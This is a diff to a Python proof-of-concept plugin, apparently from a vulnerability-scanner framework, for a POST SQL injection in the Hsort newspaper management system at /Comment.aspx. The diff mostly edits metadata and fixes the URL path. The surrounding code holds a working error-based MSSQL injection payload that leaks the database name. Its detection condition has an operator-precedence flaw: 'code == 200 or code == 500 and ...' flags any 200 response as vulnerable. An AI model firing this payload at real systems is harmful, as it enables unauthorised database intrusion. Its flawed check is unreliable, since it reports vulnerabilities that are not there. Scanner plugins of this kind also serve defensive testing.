@@ -6,14 +6,14 @@ hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
     vuln_id = 'Hsort_0006' # 平台漏洞编号，留空
-    name = 'Hsort报刊管理系统漏洞打包post注入一处' # 漏洞名称
+    name = 'Hsort报刊管理系统 post注入' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.INJECTION # 漏洞类型
     disclosure_date = '2015-07-29'  # 漏洞公布时间
     desc = '''
-        Hsort报刊管理系统漏洞打包post注入一处
+        Hsort报刊管理系统 /Comment.aspx post注入。
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0110055' # 漏洞来源
+    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0110055
     cnvd_id = '' # cnvd漏洞编号
     cve_id = '' #cve编号
     product = 'Hsort'  # 漏洞应用名称
@@ -34,7 +34,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             post='/author1=3&isGuest=true&content1=3&bname=111&pagenum=1&qnum=96&pname=%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--&newsid=3&isnews=false'
-            target=arg+'Comment.aspx'
+            target=arg+'/Comment.aspx'
             code, head, res, errcode, _ = hh.http(target,post=post) 
             if code == 200 or code ==500 and 'testXQ17' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
